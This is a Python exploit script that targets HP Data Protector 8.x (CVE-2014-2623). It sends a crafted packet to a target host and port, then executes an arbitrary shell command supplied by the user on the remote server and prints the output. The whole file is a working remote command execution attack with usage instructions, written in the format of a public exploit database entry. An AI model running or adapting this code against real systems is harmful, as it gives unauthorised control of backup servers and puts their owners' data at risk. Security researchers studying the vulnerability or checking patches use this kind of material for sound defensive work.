#!/usr/bin/python

# Exploit Title: HP-Data-Protector-8.x Remote command execution.
# Google Dork: -
# Date: 30/01/2015
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818
# Software Link: http://www8.hp.com/th/en/software-solutions/data-protector-backup-recovery-software/
# Version: 8.x
# Tested on: IA64 HP Server Rx3600
# CVE : CVE-2014-2623
# Usage: hp_data_protector_8_x.py <target ip> <port> <command e.g. "uname -m">"

import socket
import struct
import sys

def exploit(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        print "[+] Target connected."

        OFFSET_DEC_START = 133
        OFFSET_DEC = (OFFSET_DEC_START + len(command))
        # print "OFFSET_DEC_START:" + str(OFFSET_DEC_START)
        # print "len(command)" + str(len(command))
        # print "OFFSET_DEC" + str(OFFSET_DEC)
        OFFSET_HEX = "%x" % OFFSET_DEC
        # print "OFFSET_HEX" + str(OFFSET_HEX)
        OFFSET_USE = chr(OFFSET_DEC)
        # print "Command Length: " + str(len(command))
        PACKET_DATA = "\x00\x00\x00"+\
        OFFSET_USE+\
        "\x20\x32\x00\x20\x73\x73\x73\x73\x73\x73\x00\x20\x30" + \
        "\x00\x20\x54\x45\x53\x54\x45\x52\x00\x20\x74\x65\x73\x74\x65\x72\x00" + \
        "\x20\x43\x00\x20\x32\x30\x00\x20\x74\x65\x73\x65\x72\x74\x65\x73\x74" + \
        "\x2E\x65\x78\x65\x00\x20\x72\x65\x73\x65\x61\x72\x63\x68\x00\x20\x2F" + \
        "\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75" + \
        "\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x30\x00" + \
        "\x20\x32\x00\x20\x75\x74\x69\x6C\x6E\x73\x2F\x64\x65\x74\x61\x63\x68" + \
        "\x00\x20\x2D\x64\x69\x72\x20\x2F\x62\x69\x6E\x20\x2D\x63\x6F\x6D\x20" + \
        " %s\x00" %command

        # Send payload to target
        print "[+] Sending PACKET_DATA"
        sock.sendall(PACKET_DATA)

        # Parse the response back
        print "[*] Result:"
        while True:
            response = sock.recv(2048)
            if not response: break
            print response

    except Exception as ex:
        print >> sys.stderr, "[-] Socket error: \n\t%s" % ex
        exit(-3)
    sock.close()

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
        command = sys.argv[3]
        exploit(target, port, command)
    except IndexError:
         print("Usage: hp_data_protector_8_x.py <target ip> <port> <command e.g. \"uname -m\">")
    exit(0)